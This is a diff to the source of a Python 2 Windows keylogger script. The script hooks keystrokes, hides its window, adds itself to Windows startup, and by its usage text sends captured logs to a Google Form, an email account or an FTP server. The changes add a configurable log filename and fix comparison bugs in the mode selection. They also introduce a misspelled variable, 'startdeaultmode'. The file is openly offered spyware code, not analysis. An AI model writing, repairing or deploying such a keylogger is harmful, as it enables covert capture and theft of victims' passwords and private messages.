@@ -31,6 +31,8 @@ defaultmode = "local"
 # Add program to startup by default?
 defaultstartup = False
 
+# The name of the local log file
+logname = "key.log"
 
 try:
     import pythoncom, pyHook
@@ -65,21 +67,23 @@ def hide():
     return True
 
 def msg():
-    print """
+    if not startdeaultmode == True:
+        print """
 
-usage: keylogger-2.7.py [mode] [optional:startup]
+    usage: keylogger-2.7.py <mode> [optional:startup]
 
-mode:
-     local: store the logs in a file [key.log]
+    mode:
+         local: store the logs in a file [default: key.log]
 
-     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
+         remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
 
-     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
+         email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
 
-     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
+         ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
 
-[optional] startup: This will add the keylogger to windows startup.\n\n"""
-    return True
+    [optional] startup: This will add the keylogger to windows startup.\n\n"""
+        return True
+
 
 # Add to startup
 def addStartup():
@@ -97,7 +101,7 @@ def addStartup():
 def local():
     global data
     if len(data)>collect:
-        fp=open("key.log","a")
+        fp=open(logname,"a")
         fp.write(data)
         fp.close()
         data=''
@@ -196,13 +200,13 @@ def main():
         addstartup()
 
     if startdefaultmode == True:
-        if defaultmode = "local":
+        if defaultmode == "local":
             x=1
             hide()
-        elif defaultmode = "remote":
+        elif defaultmode == "remote":
             x=2
             hide()
-        elif defaultmode = "email":
+        elif defaultmode == "email":
             hide()
             email=TimerClass()
             email.start()
